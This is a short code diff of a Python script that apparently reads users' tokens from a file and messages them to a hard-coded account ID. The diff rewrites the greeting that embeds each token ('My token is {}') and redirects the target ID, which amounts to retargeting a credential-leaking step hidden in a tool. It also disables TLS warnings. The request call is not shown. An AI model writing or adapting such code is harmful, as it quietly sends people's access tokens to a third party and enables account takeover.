@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Satpal  sir! I am using your server. My token is {}"
+      msg_template = "Hello Satpal  Legend! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "102835350388769"
+      target_id = "1308472243158401"
 
       requests.packages.urllib3.disable_warnings()
 
